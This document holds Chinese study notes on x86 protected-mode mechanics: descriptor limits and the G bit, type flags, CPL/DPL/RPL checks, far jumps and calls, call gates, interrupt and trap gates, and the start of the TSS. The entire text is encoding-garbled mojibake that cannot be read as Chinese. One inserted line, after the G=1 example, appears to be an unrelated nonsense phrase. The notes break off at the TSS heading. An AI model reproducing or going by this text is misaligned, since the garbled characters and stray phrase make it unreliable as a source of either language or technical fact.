2.å¦‚æœGä½ä¸º1ï¼Œé‚£ä¹ˆLimitå•ä½æ˜¯4KBï¼Œ4x1024=4096,4096ä»£è¡¨æœ‰å¤šå°‘ä¸ªï¼Œä½†æ˜¯åœ°å€è®¡ç®—éƒ½æ˜¯ä»0å¼€å§‹çš„ï¼Œé‚£ä¹ˆéœ€è¦å‡1ï¼Œå³ä¸Šé™ä¸º4096-1=4095,åˆšå¥½è½¬ä¸º0xfffï¼Œå¦‚æœæ­¤æ—¶Limitç•Œé™ä¸º1çš„è¯ï¼Œé‚£ä¹ˆæ­¤æ—¶ä¸º0x1FFFï¼Œåˆ™æœ€å¤§å¯ä»¥ä¸º0xffffffff\nä¸ç†è§£ï¼šå¦‚æœç²’åº¦ G=0ï¼ŒLIMIT= 0x3ffï¼Œè¿™æ„å‘³ç€è¯¥æ®µçš„å¤§å°æ˜¯ 0x3ff+1=0x400 å­—èŠ‚ã€‚å¦‚æœ G=1ï¼Œé‚£æ„å‘³ç€è¯¥æ®µçš„å¤§å°æ˜¯(0x3ff+1)*4KB=0x400000å­—èŠ‚ï¼Œæ‰€ä»¥æ¢ç®—åçš„ limit = 0x400000-1=0x003fffff.\nå†ä¸¾ä¸ªä¾‹å­ã€‚LIMIT=0xfffff, G=1,åˆ™è¯¥æ®µçš„å¤§å°æ˜¯ (0xfffff+1)*4KB=0x100000*0x1000=0x100000000å­—èŠ‚ï¼Œæ‰€ä»¥æ¢ç®—åçš„ limit=0x100000000-1=0xffffffff\nç‹—å¤šåŠé›¶å®‰ï¼Œä¹ï¼Œç ´åœ°çš®ä¸¤æ ‘ï¼Œåœ\næ€»ç»“ï¼š å¦‚æœ G = 0ï¼ŒæŠŠæ®µæè¿°ç¬¦ä¸­çš„ 20 bit LIMITå–å‡ºæ¥ï¼Œæ¯”å¦‚ 0x003ffï¼Œç„¶ååœ¨å‰é¢è¡¥ 0 è‡³32bitï¼Œå³ limit = 0x000003ff å¦‚æœ G = 1ï¼ŒæŠŠæ®µæè¿°ç¬¦ä¸­çš„ 20 bit LIMITå–å‡ºæ¥ï¼Œæ¯”å¦‚ 0x003ffï¼Œç„¶ååœ¨åé¢è¡¥ f è‡³ 32bit, å³ LIMIT = 0x003fffff S: è¯¥ä½ä¸º 1 è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªæ•°æ®æ®µæˆ–è€…ä»£ç æ®µã€‚ä¸º 0 è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªç³»ç»Ÿæ®µï¼ˆæ¯”å¦‚è°ƒç”¨é—¨ï¼Œä¸­æ–­é—¨ç­‰ï¼‰\né¢æˆ‘ä»¬å…ˆæ‰¾æ•°æ®æ®µæˆ–è€…ä»£ç æ®µï¼Œsä½çš„ä¸åŒä¼šå¯¼è‡´TYPEåŸŸå‘ç”Ÿå˜åŒ–ã€‚è¿™å¼ å›¾æ˜¯TYPEåŸŸæ»¡è¶³ä»€ä¹ˆæ¡ä»¶ä¸‹æ˜¯æ•°æ®æ®µæˆ–ä»£ç æ®µï¼š\nå› ä¸ºDPLçš„å€¼åªå¯èƒ½æ˜¯å…¨1æˆ–å…¨0ï¼Œæ‰€ä»¥16~12ä½å¦‚æœæ˜¯æ•°æ®æ®µæˆ–ä»£ç æ®µçš„è¯åªèƒ½ä¸ºf(1111)æˆ–9(1001)ã€‚é‚£ä¹ˆåœ¨æ®µæè¿°ç¬¦ä¸­æ‰¾ç¬¬äº”ä½ï¼Œå¦‚æœæ˜¯fæˆ–9å°±æ˜¯æ•°æ®æ®µæˆ–ä»£ç æ®µã€‚ å› ä¸ºTYPEåŸŸçš„ç¬¬11ä½åªå¯èƒ½æ˜¯1æˆ–0ï¼Œè€Œä¸”å…¨ä¸º1æ˜¯ä»£ç æ®µï¼›å…¨ä¸º0æ˜¯æ•°æ®æ®µã€‚é‚£ä¹ˆç¬¬å…­ä½å¤§äº8å°±æ˜¯ä»£ç æ®µï¼Œå°äº8å°±æ˜¯æ•°æ®æ®µã€‚ æ¥çœ‹æ•°æ®æ®µçš„æ ‡å¿—ä½ï¼š\nEï¼šå¦‚æœä¸º1ï¼Œè¡¨ç¤ºå‘ä¸‹æ‰©å±•(å³å›¾)ï¼›E=0ï¼Œè¡¨ç¤ºå‘ä¸Šæ‰©å±•(å·¦å›¾)ï¼Œwindowsåªä½¿ç”¨å‘ä¸Šæ‰©å±•ï¼Œä¹Ÿå°±æ˜¯Eä¸º0 Wï¼šå¦‚æœä¸º1ï¼Œä»£è¡¨è¯¥æ•°æ®æ®µæè¿°ç¬¦æ˜¯å¯å†™çš„ Aï¼šå¦‚æœä¸º1ï¼Œä»£è¡¨è¯¥æ•°æ®æ®µæè¿°ç¬¦å·²ç»è¢«è®¿é—®è¿‡äº† æ¥çœ‹ä»£ç æ®µçš„æ ‡å¿—ä½ï¼š\nCï¼šå¦‚æœä¸º1ï¼Œè¡¨ç¤ºä¸€è‡´ä»£ç æ®µï¼›å¦‚æœä¸º0ï¼Œè¡¨ç¤ºéä¸€è‡´ä»£ç æ®µ Rï¼šå¦‚æœä¸º1ï¼Œè¡¨ç¤ºå¯è¯»ï¼›å¦‚æœä¸º0ï¼Œè¡¨ç¤ºä¸å¯è¯» Aï¼šå¦‚æœä¸º1ï¼Œè¡¨ç¤ºæ®µæ›¾è¢«è®¿é—®ï¼›å¦‚æœä¸º0ï¼Œè¡¨ç¤ºæ®µæœªè¢«è®¿é—® ç³»ç»Ÿæ®µæè¿°ç¬¦(å°±æ˜¯sä¸º0çš„æƒ…å†µ)å¦‚ä¸‹å›¾ï¼š\nDBä½çš„å½±å“å¤§è‡´å¦‚ä¸‹ï¼š\næƒ…å†µä¸€ï¼šå¯¹CSæ®µçš„å½±å“\nD=1 é‡‡ç”¨32ä½å¯»å€æ–¹å¼\nD =0 é‡‡ç”¨16ä½å¯»å€æ–¹å¼\nå‰ç¼€67 æ”¹å˜å¯»å€æ–¹å¼\næƒ…å†µäºŒï¼šå¯¹SSæ®µçš„å½±å“(è¿™ä¸ªéšå¼å¤§æ¦‚å°±æ˜¯é—´æ¥æ“ä½œæ ˆçš„æŒ‡ä»¤ï¼Œä¸åƒmovæŒ‡ä»¤è¿™æ ·ç›´æ¥æ§åˆ¶espæˆ–ebp)\nD=1 éšå¼å †æ ˆè®¿é—®æŒ‡ä»¤(å¦‚: PUSH POP CALL)ä½¿ç”¨32ä½å †æ ˆæŒ‡é’ˆå¯„å­˜å™¨ESP D=0 éšå¼å †æ ˆè®¿é—®æŒ‡ä»¤(å¦‚:PUSH POP CALL)ä½¿ç”¨16ä½å †æ ˆæŒ‡é’ˆå¯„å­˜å™¨SP æƒ…å†µä¸‰ï¼šå‘ä¸‹æ‹“å±•çš„æ•°æ®æ®µ\nD=1æ®µä¸Šçº¿ä¸º4GB D=0æ®µä¸Šçº¿ä¸º64KB æ®µæƒé™æ£€æŸ¥ cpuçš„åˆ†çº§ï¼š\nå¦‚ä½•æŸ¥çœ‹ç¨‹åºå¤„äºå‡ ç¯ï¼š\nCPL(Current Privilege Level)ï¼šå½“å‰ç‰¹æƒçº§(æ˜¯å‡ ç¨‹åºå°±åœ¨å‡ ç¯) CSå’ŒSSä¸­å­˜å‚¨çš„æ®µé€‰æ‹©å­å2ä½.(äºŒè€…ç›¸åŒçš„éƒ½æ˜¯CPL) DPL(Descriptor Privilege Level)æè¿°ç¬¦ç‰¹æƒçº§åˆ«ï¼š\nDPLå­˜å‚¨åœ¨æ®µæè¿°ç¬¦ä¸­ï¼Œè§„å®šäº†è®¿é—®è¯¥æ®µæ‰€éœ€è¦çš„ç‰¹æƒçº§åˆ«æ˜¯ä»€ä¹ˆã€‚\né€šä¿—çš„ç†è§£ï¼šå¦‚æœä½ æƒ³è®¿é—®æˆ‘ï¼Œé‚£ä¹ˆä½ åº”è¯¥å…·å¤‡ä»€ä¹ˆç‰¹æƒã€‚\nä¸¾ä¾‹è¯´æ˜ï¼š\nmov DS,AX å¦‚æœAXæŒ‡å‘çš„æ®µDPL=0ä½†å½“å‰ç¨‹åºçš„CPL=3è¿™è¡ŒæŒ‡ä»¤æ˜¯ä¸ä¼šæˆåŠŸçš„!\nRPL(Request Privilege Level)è¯·æ±‚ç‰¹æƒçº§åˆ«ä¸¾ä¾‹è¯´æ˜ï¼š\né€šä¿—çš„ç†è§£ï¼šå½“å‰æ®µé€‰æ‹©å­çš„æƒé™\næ¯”è¾ƒmov ax,0008ä¸mov ax,000Bå¹¶ä¸”ä¹‹åå‡æ‰§è¡Œmov ds,axçš„åŒºåˆ«\n(åŒºåˆ«æ˜¯8çš„äºŒè¿›åˆ¶ä¸º1000ï¼ŒBçš„äºŒè¿›åˆ¶ä¸º1011ï¼Œæ— åˆ«å°±åœ¨äºæœ€åçš„ä¸¤ä½æ‰€ä»£è¡¨çš„RPLä¸åŒ)\nå°†æ®µæè¿°æŒ‡å‘çš„æ˜¯åŒä¸€ä¸ªæ®µæè¿°ç¬¦ï¼Œä½†RPLæ˜¯ä¸ä¸€æ ·çš„.\næ•°æ®æ®µçš„æƒé™æ£€æŸ¥å‚è€ƒå¦‚ä¸‹ä»£ç :\næ¯”å¦‚å½“å‰ç¨‹åºå¤„äº0ç¯,ä¹Ÿå°±æ˜¯è¯´CPL=0\nmov ax,000B\t//1011ä¹Ÿå°±æ˜¯RPL = 3 mov ds,ax\t//axæŒ‡å‘çš„æ®µæè¿°ç¬¦çš„DPL = 0 æ•°æ®æ®µçš„æƒé™æ£€æŸ¥ï¼š\nCPL \u003c= DPL å¹¶ä¸” RPL \u003c= DPL (æ•°å€¼E8æ¯”è¾ƒ)\næ³¨æ„ï¼šä»£ç æ®µå’Œç³»ç»Ÿæ®µæè¿°ç¬¦ä¸­çš„æ£€æŸ¥æ–¹å¼å¹¶ä¸ä¸€æ ·ã€‚\næ€»ç»“ä¸€ä¸‹ï¼š\nCPL -\u003e CPUå½“å‰çš„æƒé™çº§åˆ« DPL -\u003e å¦‚æœä½ æƒ³è®¿é—®æˆ‘,ä½ åº”è¯¥å…·å¤‡ä»€ä¹ˆæ ·çš„æƒé™ RPL -\u003e ç”¨ä»€ä¹ˆæƒé™å»è®¿é—®ä¸€ä¸ªæ®µ(æ¯”å¦‚é«˜æƒé™å¯ä»¥ç”¨ä½æƒé™è®¿é—®) ä¸ºå•¥è¦æœ‰RPL? æˆ‘ä»¬æœ¬å¯ä»¥ç”¨â€œè¯» å†™â€çš„æƒé™å»æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œä½†ä¸ºäº†é¿å…å‡ºé”™ï¼Œæœ‰äº›æ—¶å€™æˆ‘ä»¬ä½¿ç”¨â€œåªè¯»â€çš„æƒé™å»æ‰“å¼€ã€‚å°±æ˜¯é™åˆ¶ç¨‹åºæƒé™çš„ä½¿ç”¨ï¼Œå°½é‡è§„é¿ææƒæ¼æ´(å§)ã€‚ ä»£ç çš„è·¨æ®µè·³è½¬æµç¨‹ æœ¬è´¨å°±æ˜¯ä¿®æ”¹cså¯„å­˜å™¨\nä»£ç é—´çš„è·³è½¬(æ®µé—´è·³è½¬ éè°ƒç”¨é—¨ä¹‹ç±»çš„)\næ®µé—´è·³è½¬æœ‰2ç§æƒ…å†µ,å³è¦è·³è½¬çš„æ®µæ˜¯ä¸€è‡´ä»£ç æ®µè¿˜æ˜¯éä¸€è‡´ä»£ç æ®µã€‚\nåŒæ—¶ä¿®æ”¹CSä¸EIPçš„æŒ‡ä»¤JMP FAR / CALL FAR / RETF / INT / IRETED\næ³¨æ„ï¼šåªæ”¹å˜EIPçš„æŒ‡ä»¤JMP / CALL / JCC / RET\nè¿œè·³(jmp far)çš„æ‰§è¡Œæµç¨‹\njmp 0x20:0x004183D\nå°†å‰é¢çš„æ®µå¯„å­˜å™¨æ‹†æˆæ®µé€‰æ‹©å­ï¼š\n0x20å¯¹åº”äºŒè¿›åˆ¶å½¢å¼ 0000 0000 0010 0000 RPL=00 TI=0 Index=4 å› ä¸ºTI=0ï¼Œæ‰€ä»¥è¦æŸ¥GDTè¡¨ï¼Œæ‰¾å¯¹åº”Indexçš„æ®µæè¿°ç¬¦\nè¿™å››ç§æƒ…å†µå¯ä»¥è·³è½¬ï¼šä»£ç æ®µã€è°ƒç”¨é—¨ã€TSSä»»åŠ¡æ®µã€ä»»åŠ¡é—¨\næƒé™æ£€æŸ¥\nå¦‚æœæ˜¯éä¸€è‡´ä»£ç æ®µï¼Œè¦æ±‚ï¼šCPL == DPL å¹¶ä¸” RPL \u003c= DPL\nå¦‚æœæ˜¯ä¸€è‡´ä»£ç æ®µï¼Œè¦æ±‚ï¼šCPL\u003e= DPL\nè§£é‡Šä¸€ä¸‹ï¼šå‡è®¾æˆ‘å¯ä»¥ç”¨ä¸åŒçš„æƒåŠ›å»æ§åˆ¶åˆ«äººï¼Œæˆ‘è‡ªå·±çš„æƒåŠ›å’Œæˆ‘æ‰€ä½¿ç”¨çš„æƒåŠ›ä¼šæœ‰åŒºåˆ«ã€‚(æƒé™è¶Šé«˜è¶Šå°)\nCPL == DPLï¼šæˆ‘å¯ä»¥æ§åˆ¶ä¸è‡ªå·±çš„æƒåŠ›ä¸€æ ·çš„äººã€‚ RPL \u003c= DPLï¼šæˆ‘æ‰€ä½¿ç”¨å¤§çš„æƒåŠ›ï¼Œè‡ªç„¶çš„å¯ä»¥æ§åˆ¶æƒåŠ›æ¯”æˆ‘å°çš„äººã€‚ CPL \u003e= DPLï¼šæˆ‘è‡ªå·±çš„æƒåŠ›å°äºåˆ«äººçš„æƒåŠ›ã€‚ æ€»ç»“ï¼š\nå¯¹äºä¸€è‡´ä»£ç æ®µ:ä¹Ÿå°±æ˜¯å…±äº«çš„æ®µ\nç‰¹æƒçº§é«˜çš„ç¨‹åºä¸å…è®¸è®¿é—®ç‰¹æƒçº§ä½çš„æ•°æ®:æ ¸å¿ƒæ€ä¸å…è®¸è®¿é—®ç”¨æˆ·æ€çš„æ•°æ® ç‰¹æƒçº§ä½çš„ç¨‹åºå¯ä»¥è®¿é—®åˆ°ç‰¹æƒçº§é«˜çš„æ•°æ®,ä½†ç‰¹æƒçº§ä¸ä¼šæ”¹å˜ï¼šç”¨æˆ·æ€è¿˜æ˜¯ç”¨æˆ·æ€ å¯¹äºæ™®é€šä»£ç æ®µ:ä¹Ÿå°±æ˜¯éä¸€è‡´ä»£ç æ®µ\nåªå…è®¸åŒçº§è®¿é—® ç»å¯¹ç¦æ­¢ä¸åŒçº§åˆ«çš„è®¿é—®:æ ¸å¿ƒæ€ä¸æ˜¯ç”¨æˆ·æ€,ç”¨æˆ·æ€ä¹Ÿä¸æ˜¯æ ¸å¿ƒæ€. ç›´æ¥å¯¹ä»£ç æ®µè¿›è¡ŒJMPæˆ–è€…CALLçš„æ“ä½œï¼Œæ— è®ºç›®æ ‡æ˜¯ä¸€è‡´ä»£ç æ®µè¿˜æ˜¯éä¸€è‡´ä»£ç æ®µ, CPLéƒ½ä¸ä¼šå‘ç”Ÿæ”¹å˜ã€‚å¦‚æœè¦æå‡CPLçš„æƒé™ï¼Œåªèƒ½é€šè¿‡è°ƒç”¨é—¨ã€‚\nåŠ è½½æ®µæè¿°ç¬¦\né€šè¿‡ä¸Šé¢çš„æƒé™æ£€æŸ¥åï¼ŒCPUä¼šå°†æ®µæè¿°ç¬¦åŠ è½½åˆ°CSæ®µå¯„å­˜å™¨ä¸­ã€‚\nä»£ç æ‰§è¡Œ\nCPUå°† CS.Base + Offset (å°±æ˜¯å†’å·åé¢çš„å€¼)çš„å€¼å†™å…¥EIP ç„¶åæ‰§è¡ŒCS:EIPå¤„çš„ä»£ç ï¼Œæ®µé—´è·³è½¬ç»“æŸã€‚\næ€»ç»“ï¼š\nä¸ºäº†å¯¹æ•°æ®è¿›è¡Œä¿æŠ¤,æ™®é€šä»£ç æ®µæ˜¯ç¦æ­¢ä¸åŒçº§åˆ«è¿›è¡Œè®¿é—®çš„ã€‚ç”¨æˆ·æ€çš„ä»£ç ä¸èƒ½è®¿é—®å†…æ ¸çš„æ•°æ®,åŒæ ·,å†…æ ¸æ€çš„ä»£ç ä¹Ÿä¸èƒ½è®¿é—®ç”¨æˆ·æ€çš„æ•°æ®ã€‚ å¦‚æœæƒ³æä¾›ä¸€äº›é€šç”¨çš„åŠŸèƒ½ï¼Œè€Œä¸”è¿™äº›åŠŸèƒ½å¹¶ä¸ä¼šç ´åå†…æ ¸æ•°æ®ï¼Œé‚£ä¹ˆå¯ä»¥é€‰æ‹©ä¸€è‡´ä»£ç æ®µ,è¿™æ ·ä½çº§åˆ«çš„ç¨‹åºå¯ä»¥åœ¨ä¸æå‡CPLæƒé™ç­‰çº§çš„æƒ…å†µä¸‹å³å¯ä»¥è®¿é—®ã€‚ å¦‚æœæƒ³è®¿é—®æ™®é€šä»£ç æ®µ,åªæœ‰é€šè¿‡â€™è°ƒç”¨é—¨â€™ç­‰æç¤ºCPLæƒé™,æ‰èƒ½è®¿é—®ã€‚ é•¿è°ƒç”¨ä¸çŸ­è°ƒç”¨ çŸ­è°ƒç”¨ï¼š\næŒ‡ä»¤æ ¼å¼ï¼šcall ç«‹å³æ•° / å¯„å­˜å™¨ / å†…å­˜ æŠŠcallå½“å‰åœ°å€çš„ä¸‹ä¸€ä¸ªåœ°å€å…¥æ ˆï¼Œç„¶åå°†eipè·³åˆ°callåé¢è·Ÿçš„åœ°å€ã€‚æ‰§è¡Œåˆ°retåè¿”å›(åˆ°å…¥æ ˆçš„åœ°å€) å‘ç”Ÿæ”¹å˜çš„å¯„å­˜å™¨: esp eip é•¿è°ƒç”¨(è·¨æ®µä¸ææƒ)ï¼š\næŒ‡ä»¤æ ¼å¼: CALL CS:EIP (EIPæ˜¯åºŸå¼ƒçš„)\nå…ˆå…¥æ ˆè°ƒç”¨è€…çš„CSæ®µé€‰æ‹©å­ï¼Œå†æŠŠå½“å‰åœ°å€çš„ä¸‹ä¸€ä¸ªåœ°å€å…¥æ ˆ(è¿”å›åœ°å€)\næ‰§è¡Œå‰ æ‰§è¡Œå è¿”å›åœ°å€ è°ƒç”¨è€…çš„CSæ®µé€‰æ‹©å­ xxxxxxxx xxxxxxxx å‘ç”Ÿæ”¹å˜çš„å¯„å­˜å™¨: ESP EIP CS\né•¿è°ƒç”¨(è·¨æ®µææƒ)ï¼š\næŒ‡ä»¤æ ¼å¼: CALL CS:EIP (EIPæ˜¯åºŸå¼ƒçš„)\næ‰§è¡Œå‰çš„æ ˆæ˜¯3ç¯çš„æ ˆï¼Œæ‰§è¡Œåæ˜¯0ç¯çš„æ ˆ(CPL)ï¼Œæ‰€ä»¥æ˜¯åœ¨0ç¯çš„æ ˆé‡Œé¢å‹å…¥çš„ä¸€ç³»åˆ—å‚æ•°ã€‚\næ‰§è¡Œå‰(åœ¨3ç¯) æ‰§è¡Œå(åœ¨0ç¯) è¿”å›åœ°å€ è°ƒç”¨è€…CS è°ƒç”¨è€…ESP è°ƒç”¨è€…SS xxxxxxxx xxxxxxxx æ€»ç»“ï¼š\nè·¨æ®µè°ƒç”¨æ—¶ï¼Œä¸€æ—¦æœ‰æƒé™åˆ‡æ¢ï¼Œå°±ä¼šåˆ‡æ¢å †æ ˆã€‚ CSçš„æƒé™ä¸€æ—¦æ”¹å˜ï¼ŒSSçš„æƒé™ä¹Ÿè¦éšç€æ”¹å˜ï¼ŒCSä¸SSçš„ç­‰çº§å¿…é¡»ä¸€æ ·ã€‚ JMP FARåªèƒ½è·³è½¬åˆ°åŒçº§éä¸€è‡´ä»£ç æ®µï¼Œä½†CALL FARå¯ä»¥é€šè¿‡è°ƒç”¨é—¨ææƒï¼Œæå‡CPLçš„æƒé™ã€‚ è°ƒç”¨é—¨ é—¨æè¿°ç¬¦æ˜¯ç³»ç»Ÿæ®µæè¿°ç¬¦çš„ä¸€ç±»ã€‚æ‰€ä»¥é—¨æè¿°ç¬¦S=0ï¼ŒTYPE=1100\næ‰€ä»¥å¦‚ä¸‹ï¼š\n0000 0000 0000 0000 -\u003e Offset 1110 -\u003e Pã€DPLã€S 1100 -\u003e Type 0000 0000 -\u003e 0 - 7ä½ 0x0000EC00 ä½32ä½æ®µé€‰æ‹©å­å¯ä»¥è®¾ä¸º0x0008ï¼ˆå¯¹åº”0ç¯ä»£ç æ®µï¼‰ã€0x001Bï¼ˆå¯¹åº”3ç¯ä»£ç æ®µï¼‰ 0x00080000 åŠ ä¸Šåç§»å°±å¯ä»¥ä½¿ç”¨äº† è°ƒç”¨é—¨æ‰§è¡Œæµç¨‹\næŒ‡ä»¤æ ¼å¼ï¼šCALL CS:EIP(EIPæ˜¯åºŸå¼ƒçš„)\næ‰§è¡Œæ­¥éª¤ï¼š\næ ¹æ®CSçš„å€¼æŸ¥GDTè¡¨ï¼Œæ‰¾åˆ°å¯¹åº”çš„æ®µæè¿°ç¬¦è¿™ä¸ªæè¿°ç¬¦æ˜¯ä¸€ä¸ªè°ƒç”¨é—¨ã€‚ åœ¨è°ƒç”¨é—¨æè¿°ç¬¦ä¸­å­˜å‚¨å¦ä¸€ä¸ªä»£ç æ®µçš„é€‰æ‹©å­ã€‚ é€‰æ‹©å­æŒ‡å‘çš„æ®µ æ®µ.Base+ åç§»åœ°å€ å°±æ˜¯çœŸæ­£è¦æ‰§è¡Œçš„åœ°å€ã€‚ã€ ç»“æ„è¯´æ˜ï¼š\nå­—æ®µ å†…å®¹ offset in segment è¦è·³è½¬çš„å‡½æ•°çš„åœ°å€ï¼Œæˆ–è€…æ˜¯è¦è·³è½¬çš„åœ°å€ (ä¸¤æ®µç»„æˆäº†32ä½çš„åœ°å€ï¼Œå‰é«˜ä½åä½ä½) segment selector æ®µé€‰æ‹©å­ï¼Œè¦å˜æˆçš„æ®µé€‰æ‹©å­ï¼ˆææƒçš„å…³é”®ï¼‰ Param Count å‡½æ•°å‚æ•°ä¸ªæ•° é«˜ä½5-7 å›ºå®šçš„ä¸‰ä¸ª0 Type ç³»ç»Ÿæ®µåªèƒ½æ˜¯1100ï¼ˆ10è¿›åˆ¶çš„12ï¼‰ é«˜12åœ°å€ å°±æ˜¯æ®µæè¿°ç¬¦çš„Så­—æ®µï¼Œå°±ç³»ç»Ÿè°ƒç”¨çš„å¿…é¡»æ˜¯0 DPL è‚¯å®šèµ‹å€¼ä¸º3å‘€ï¼Œè¿™æ ·ring3æ‰èƒ½ã€‚ p å’Œæ®µæè¿°ç¬¦ä¸€æ ·è¡¨ç¤ºè¯¥æ®µæ˜¯å¦æœ‰æ•ˆï¼Œå½“Pä¸º0æ—¶æ— æ•ˆï¼Œ1æ—¶æœ‰æ•ˆã€‚ è°ƒç”¨é—¨æ€»ç»“ï¼š\nå½“é€šè¿‡é—¨ï¼Œæƒé™ä¸å˜çš„æ—¶å€™ï¼Œåªä¼šPUSHä¸¤ä¸ªå€¼: CSè¿”å›åœ°å€æ–°çš„CSçš„å€¼ç”±è°ƒç”¨é—¨å†³å®šã€‚ å½“é€šè¿‡é—¨ï¼Œæƒé™æ”¹å˜çš„æ—¶å€™ï¼Œä¼šPUSHå››ä¸ªå€¼ï¼šSS ESP CS è¿”å›åœ°å€ æ–°çš„CSçš„å€¼ç”±è°ƒç”¨é—¨å†³å®š æ–°çš„SSå’ŒESPç”±TSSæä¾›ã€‚ é€šè¿‡é—¨è°ƒç”¨æ—¶ï¼Œè¦æ‰§è¡Œå“ªè¡Œä»£ç æœ‰è°ƒç”¨é—¨å†³å®šï¼Œä½†ä½¿ç”¨RETFè¿”å›æ—¶ï¼Œç”±å †æ ˆä¸­å‹äººçš„å€¼å†³å®šï¼Œè¿™å°±æ˜¯è¯´ï¼Œè¿›é—¨æ—¶åªèƒ½æŒ‰æŒ‡å®šè·¯çº¿èµ°ï¼Œå‡ºé—¨æ—¶å¯ä»¥ç¿»å¢™ï¼ˆåªè¦æ”¹å˜å †æ ˆé‡Œé¢çš„å€¼å°±å¯ä»¥æƒ³å»å“ªå»å“ªï¼‰ã€‚ å¯ä¸å¯ä»¥å†å»ºä¸ªé—¨å‡ºå»å‘¢ï¼Ÿä¹Ÿå°±æ˜¯ç”¨Call å½“ç„¶å¯ä»¥äº† å‰é—¨è¿› åé—¨å‡ºã€‚ ä¸­æ–­é—¨ Windowsæ²¡æœ‰ä½¿ç”¨è°ƒç”¨é—¨ï¼Œä½†æ˜¯ä½¿ç”¨äº†ä¸­æ–­é—¨ï¼š\u003c1\u003e ç³»ç»Ÿè°ƒç”¨\t\u003c2\u003e è°ƒè¯•\nè°ƒç”¨é—¨ä¼šå»æŸ¥GDTè¡¨ï¼Œä¸­æ–­é—¨å´å›å»æŸ¥IDTè¡¨(ä¸­æ–­æè¿°ç¬¦è¡¨)ã€‚\nIDTå³ä¸­æ–­æè¿°ç¬¦è¡¨ï¼ŒåŒGDTä¸€æ ·ï¼ŒIDTä¹Ÿæ˜¯ç”±ä¸€ç³»åˆ—æè¿°ç¬¦ç»„æˆçš„ï¼Œæ¯ä¸ªæè¿°ç¬¦å 8ä¸ªå­—èŠ‚ã€‚ä½†è¦æ³¨æ„çš„æ˜¯ï¼ŒIDTè¡¨ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¸æ˜¯NULLã€‚\nIDTè¡¨å¯ä»¥åŒ…å«3ç§é—¨æè¿°ç¬¦:\tä»»åŠ¡é—¨æè¿°ç¬¦\tä¸­æ–­é—¨æè¿°ç¬¦\té™·é˜±é—¨æè¿°ç¬¦\næŒ‡ä»¤æ ¼å¼ï¼šINT N (Nä¸ºä¸­æ–­é—¨ç´¢å¼•å·)\nä¸­æ–­é—¨å¦‚ä¸‹ï¼šï¼ˆå›¾ä¸­çš„Dè¡¨ç¤ºæ˜¯å¦ä¸º32ä½ï¼Œå¦‚æœæ˜¯åˆ™ä¸º1ï¼‰\nä¸è°ƒç”¨é—¨ç±»ä¼¼ä¼šäº§ç”Ÿå¦‚ä¸‹çš„æƒ…å†µï¼š\nåœ¨æ²¡æœ‰æƒé™åˆ‡æ¢æ—¶ï¼Œä¼šå‘å †æ ˆé¡ºæ¬¡å‹å…¥EFLAGã€CSå’ŒEIPï¼›å¦‚æœæœ‰æƒé™åˆ‡æ¢ï¼Œä¼šå‘å †æ ˆé¡ºæ¬¡å‹å…¥SSã€ESPã€EFLAGã€CSå’ŒEIPã€‚ CPUä¼šç´¢å¼•åˆ°IDTè¡¨ã€‚åé¢çš„Nè¡¨ç¤ºæŸ¥IDTè¡¨é¡¹çš„ä¸‹æ ‡ã€‚å¯¹æ¯”è°ƒç”¨é—¨ï¼Œä¸­æ–­é—¨æ²¡æœ‰äº†RPLï¼Œæ•…CPUåªä¼šæ ¡éªŒCPLã€‚ åœ¨ä¸­æ–­é—¨ä¸­,ä¸èƒ½é€šè¿‡RETFè¿”å›ï¼Œè€Œåº”è¯¥é€šè¿‡IRET/IRETDæŒ‡ä»¤è¿”å›ã€‚ é™·é˜±é—¨ é™·é˜±é—¨çš„ç»“æ„å’Œä¸­æ–­é—¨ç»“æ„å‡ ä¹ä¸€æ ·ï¼Œåªæ˜¯TypeåŸŸä¸åŒè€Œå·²ï¼ˆå›¾ä¸­çš„Dè¡¨ç¤ºæ˜¯å¦ä¸º32ä½ï¼Œå¦‚æœæ˜¯åˆ™ä¸º1ï¼‰\nä¸ä¸­æ–­é—¨çš„åŒºåˆ«ï¼Œä¸­æ–­é—¨æ‰§è¡Œæ—¶ï¼Œå°†IFä½æ¸…é›¶,ä½†é™·é˜±é—¨ä¸ä¼šã€‚\nè§£é‡Šï¼šå¦‚æœIFä½ä¸ºé›¶ï¼Œåˆ™ä¸å†æ¥æ”¶å¯å±è”½ä¸­æ–­ã€‚\nå¯å±è”½ä¸­æ–­å°±åƒæ˜¯ä½ æˆ¿é—´é‡Œçš„é—¨é“ƒï¼Œä½ å¯ä»¥é€‰æ‹©è¦ä¸è¦æ‰“å¼€é—¨å»æ¥å¾…è®¿å®¢ã€‚ ä¸å¯å±è”½ä¸­æ–­å°±åƒæ˜¯ç«è­¦å“äº†ï¼Œè¿™æ˜¯ä¸€ä¸ªç´§æ€¥æƒ…å†µï¼Œä½ ä¸èƒ½é€‰æ‹©ä¸ç®¡å®ƒã€‚ ä»»åŠ¡æ®µ æˆ‘ä»¬å›é¡¾ä¸€ä¸‹ä¹‹å‰æ‰€å­¦å†…å®¹ï¼Œåœ¨è°ƒç”¨é—¨ã€ä¸­æ–­é—¨ä¸é™·é˜±é—¨ä¸­ï¼Œä¸€æ—¦å‡ºç°æƒé™åˆ‡æ¢ï¼Œé‚£ä¹ˆå°±ä¼šæœ‰å †æ ˆçš„åˆ‡æ¢ã€‚è€Œä¸”ï¼Œç”±äºCSçš„CPLå‘ç”Ÿæ”¹å˜ï¼Œä¹Ÿå¯¼è‡´äº†SSä¹Ÿå¿…é¡»è¦åˆ‡æ¢ã€‚åˆ‡æ¢æ—¶ï¼Œä¼šæœ‰æ–°çš„ESPå’ŒSSä»å“ªé‡Œæ¥çš„å‘¢ï¼Ÿé‚£å°±æ˜¯ä»»åŠ¡çŠ¶æ€æ®µæä¾›çš„ã€‚ä»»åŠ¡çŠ¶æ€æ®µç®€ç§°ä»»åŠ¡æ®µï¼Œè‹±æ–‡ç¼©å†™ä¸ºTSSï¼ŒTask-state segmentã€‚\nTSSæ˜¯ä¸€å—å†…å­˜ï¼Œå¤§å°ä¸º104å­—èŠ‚ï¼Œå†…å­˜ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\nTSS 